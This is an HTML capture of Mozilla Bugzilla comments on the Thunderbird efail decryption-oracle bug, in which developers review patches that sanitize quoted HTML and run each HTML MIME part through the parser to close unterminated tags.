          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15025959_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-60"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-60" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c60">Comment 60</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 00:16 PDT" data-time="1526455000">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-60">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-60" data-comment-id="13280721">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976050" name="attach_8976050" title="Sanitize quoted HTML">attachment 8976050</a> <a href="/attachment.cgi?id=8976050&amp;action=edit" title="Sanitize quoted HTML">[details]</a> <a href="/attachment.cgi?id=8976050&amp;action=diff" title="Sanitize quoted HTML">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976050'>[review]</a>
Sanitize quoted HTML

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8976050" name="attach_8976050" title="Sanitize quoted HTML">attachment 8976050</a> <a href="/attachment.cgi?id=8976050&amp;action=edit" title="Sanitize quoted HTML">[details]</a> <a href="/attachment.cgi?id=8976050&amp;action=diff" title="Sanitize quoted HTML">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976050'>[review]</a>:
-----------------------------------------------------------------

::: mailnews/compose/src/nsMsgCompose.cpp
&#64;&#64; +694,5 &#64;&#64;
<span class="quote">&gt;        // This leaves the caret at the right place to insert a bottom signature.
&gt;        if (aHTMLEditor)
&gt; +      {
&gt; +        // Sanitize the HTML before injecting it into the composer
&gt; +        nsAutoString rawBody(aBuf);</span >

Why a new variable? Can't you call HTMLSanitize(aBuf, ...)?

&#64;&#64; +3215,5 &#64;&#64;
<span class="quote">&gt;      {
&gt;        if (aHTMLEditor)
&gt; +      {
&gt; +        // Sanitize the HTML before injecting it into the composer
&gt; +        nsAutoString rawBody(mMsgBody);</span >

Same here.</pre></div><div class="change-set" id="c61"><div class="comment" data-id="13280730" data-no="61"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-61" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15025959_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-61"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-61" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c61">Comment 61</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 00:31 PDT" data-time="1526455875">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-61">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976054"
         class="attachment patch obsolete"
         data-id="8976054" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-composer-2.diff">
      <meta itemprop="contentSize" content="2823">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8976054">
          <a class="link" href="attachment.cgi?id=8976054&amp;action=diff">
        <span id="att-8976054-description" itemprop="description">Sanitize quoted HTML (cleaned-up)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976054&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976054">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-61" data-comment-id="13280730">I've addressed the nits be removing the unneeded variables and I've added a proper patch header. Not sure why people still think they can submit raw diffs as patches. So reviewers have &quot;Automatic r- if the patch doesn't contain a decent commit message&quot; in their nick.

For the test message I attached, this works great! The decoded text becomes clearly visible in the composition.

However, forced general sanitisation of all quotes is not really acceptable. It destroys HTML replies for all users.

Can you please include a check whether the sanitisation is necessary? That's the tricky part, but you're on the right track.

Not sure whether this should be an f+ for the initiative and the promising approach or an f- for destroying things for everyone :-(</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976054&amp;action=edit"
           title="Sanitize quoted HTML (cleaned-up)"
           class=""
        >Attachment #8976054</a> -
        Flags: feedback-</div></div></div><div class="change-set" id="c62"><div class="comment" data-id="13280733" data-no="62"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-62" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15025959_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15025959_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-62"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-62" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c62">Comment 62</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 00:32 PDT" data-time="1526455973">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-62">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-62" data-comment-id="13280733">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976050" name="attach_8976050" title="Sanitize quoted HTML">attachment 8976050</a> <a href="/attachment.cgi?id=8976050&amp;action=edit" title="Sanitize quoted HTML">[details]</a> <a href="/attachment.cgi?id=8976050&amp;action=diff" title="Sanitize quoted HTML">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976050'>[review]</a>
Sanitize quoted HTML

Missing commit message.
Superfluous variables.
Good approach, but too drastic since it affects HTML quoting for all users.
But I think we're not far off. Waiting for the next round.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976050&amp;action=edit"
           title="Sanitize quoted HTML"
           class=""
        >Attachment #8976050</a> -
        Flags: review-</div></div></div><div class="change-set" id="a15181785_101158"><div class="change" id="aa15181785_101158">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15181785_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_101158" id="a15181785_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15181785_101158"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15181785_101158">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15181785_101158">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 00:44 PDT" data-time="1526456676">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8973795&amp;action=edit"
           title="bug1419417_efail_reply_fwd.patch"
           class=""
        >Attachment #8973795</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c63"><div class="comment" data-id="13280753" data-no="63"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-63" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15181785_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15181785_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-63"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-63" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c63">Comment 63</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 00:50 PDT" data-time="1526457050">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-63">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-63" data-comment-id="13280753">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c57">comment #57</a>)
<span class="quote">&gt; 2. Sanitize quoted HTML
&gt; 
&gt; The composer is more vulnerable than the viewer. In the viewer, we assume
&gt; malicious code and harden against it. Not so in the composer, which assumes
&gt; that the user enters the data.</span >

That used to be the case, but not so in 52 and above. The composer no is no longer treated differently (as an EDITOR).</pre></div><div class="change-set" id="c64"><div class="comment" data-id="13280754" data-no="64"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-64" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15181785_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15181785_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-64"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-64" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c64">Comment 64</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 00:51 PDT" data-time="1526457111">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-64">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-64" data-comment-id="13280754">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976050" name="attach_8976050" title="Sanitize quoted HTML">attachment 8976050</a> <a href="/attachment.cgi?id=8976050&amp;action=edit" title="Sanitize quoted HTML">[details]</a> <a href="/attachment.cgi?id=8976050&amp;action=diff" title="Sanitize quoted HTML">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976050'>[review]</a>
Sanitize quoted HTML

Review of <span class="bz_obsolete"><a href="/attachment.cgi?id=8976050" name="attach_8976050" title="Sanitize quoted HTML">attachment 8976050</a> <a href="/attachment.cgi?id=8976050&amp;action=edit" title="Sanitize quoted HTML">[details]</a> <a href="/attachment.cgi?id=8976050&amp;action=diff" title="Sanitize quoted HTML">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976050'>[review]</a>:
-----------------------------------------------------------------

Yeah, I agree replying with basic html for everyone is too drastic.

It should also not be necessary if the other parts you mention are implemented.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976050&amp;action=edit"
           title="Sanitize quoted HTML"
           class=""
        >Attachment #8976050</a> -
        Flags: <span class="activity-deleted">review?(mkmelin+mozilla)</span></div></div></div><div class="change-set" id="c65"><div class="comment" data-id="13280758" data-no="65"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-65" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15181785_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15181785_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-65"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-65" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c65">Comment 65</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 00:55 PDT" data-time="1526457348">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-65">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-65" data-comment-id="13280758">Maybe the code in mailnews/mime/src/mimecryp.cpp can tell us whether anything was decrypted while preparing the quote. I haven't looked. To find the right hook here would be the detective task. Sadly I don't know how it hangs together.</pre></div><div class="change-set" id="c66"><div class="comment" data-id="13280764" data-no="66"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-66" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a15181785_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_101158" id="a15181785_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-66"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-66" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c66">Comment 66</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 00:57 PDT" data-time="1526457474">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-66">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-66" data-comment-id="13280764">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c57">comment #57</a>)
<span class="quote">&gt; 1. Separate MIME parts from each other
&gt; Together, we had the idea of running the HTML document through the HTML
&gt; parser. The parser will clean up the HTML and close any open tags and
&gt; attributes and the serializer will output a complete HTML document. That
&gt; avoids that we end the MIME part with &lt;img src=&quot; and stops this attack cold.</span >

I agree this is what's need to be done. It's not clear from your comment, but *each html part* should be run separately through the parser and re-serialized out - this makes sure there are no unclosed elements and other strangeness. After that you can keep the outputs it all together as one chunk again and let the parser figure out the final document. 

If you can figure out where to do that, the bug is solved.</pre></div><div class="change-set" id="c67"><div class="comment" data-id="13280983" data-no="67"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-67" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15181785_101158"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15181785_101158"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-67"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-67" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c67">Comment 67</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 03:20 PDT" data-time="1526466017">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-67">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-67" data-comment-id="13280983"><span class="quote">&gt; *each html part* should be run separately through the parser and re-serialized out</span >

Yes, that's the plan.

I've got a fix. Coming.</pre></div><div class="change-set" id="c68"><div class="comment" data-id="13280988" data-no="68"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-68" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15181785_101158"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15181785_101158"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-68"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-68" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c68">Comment 68</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 03:24 PDT" data-time="1526466276">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-68">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-68" data-comment-id="13280988"><span class="quote">&gt; replying with basic html for everyone is too drastic.</span >

We can't allow these kinds of bugs to continue. This is not the first, I remember we had a similar bug not too long ago where stuff ran only on reply and caused a security problem. That one was not about encryption.</pre></div><div class="change-set" id="c69"><div class="comment" data-id="13280999" data-no="69"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-69" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15181785_101158"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15181785_101158"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-69"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-69" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c69">Comment 69</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 03:31 PDT" data-time="1526466716">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-69">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976074"
         class="attachment patch obsolete"
         data-id="8976074" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-parse-html-3.diff">
      <meta itemprop="contentSize" content="15533">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8976074">
          <a class="link" href="attachment.cgi?id=8976074&amp;action=diff">
        <span id="att-8976074-description" itemprop="description">Separate MIME parts from each other (for 52)</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976074&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976074">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-69" data-comment-id="13280999">This implements a new MIME class that is now used for normal HTML parts (unless you use the sanitizer). It takes the HTML source text, runs it through the Geclp HTML parser, and then immediately serializes it out again. That ensures that all tags and attributes are closed and the HTML is syntactically correct.

This happens for every MIME part with HTML. This should fix the main bug here.

I've been working on this all night long.

Thanks to smaug for lots of help with the DOM APIs. Main problem is that many APIs are now removed. Indeed, the DOM Parser API is also removed, but there's a replacement API in 61, I've noted that as comment in the code. This patch is for 52 and should also work more or less for 60.</pre></div><div class="change-set" id="c70"><div class="comment" data-id="13281055" data-no="70"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-70" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15181785_101158"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15181785_101158"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-70"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-70" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c70">Comment 70</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 04:24 PDT" data-time="1526469885">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-70">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-70" data-comment-id="13281055">Can you start a try run?</pre></div><div class="change-set" id="c71"><div class="comment" data-id="13281066" data-no="71"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-71" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15181785_101158"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15181785_101158"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-71"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-71" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c71">Comment 71</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 04:29 PDT" data-time="1526470174">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-71">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976085"
         class="attachment patch obsolete"
         data-id="8976085" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-sanitizer-cleanup-1.diff">
      <meta itemprop="contentSize" content="14051">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8976085">
          <a class="link" href="attachment.cgi?id=8976085&amp;action=diff">
        <span id="att-8976085-description" itemprop="description">Sanitizer code cleanup</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976085&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976085">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-71" data-comment-id="13281066">This cleans up the Sanitizer class code a little bit.
Not related to the bug at all. But found while I was working on the previous patch. I separated it for ease of review.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976085&amp;action=edit"
           title="Sanitizer code cleanup"
           class=""
        >Attachment #8976085</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="a15195308_22599"><div class="change" id="aa15195308_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15195308_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15195308_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15195308_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15195308_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15195308_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 04:29 PDT" data-time="1526470199">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976074&amp;action=edit"
           title="Separate MIME parts from each other (for 52)"
           class=""
        >Attachment #8976074</a> -
        Flags: review?(mkmelin+mozilla)</div></div></div><div class="change-set" id="c72"><div class="comment" data-id="13281067" data-no="72"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-72" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15195308_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15195308_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-72"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-72" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c72">Comment 72</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-16 04:31 PDT" data-time="1526470263">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-72">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976086"
         class="attachment patch obsolete"
         data-id="8976086" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="efail-composer-3.diff">
      <meta itemprop="contentSize" content="2667">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8976086">
          <a class="link" href="attachment.cgi?id=8976086&amp;action=diff">
        <span id="att-8976086-description" itemprop="description">Sanitize quoted HTML, v3</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976086&amp;action=edit" itemprop="url">Details</a>
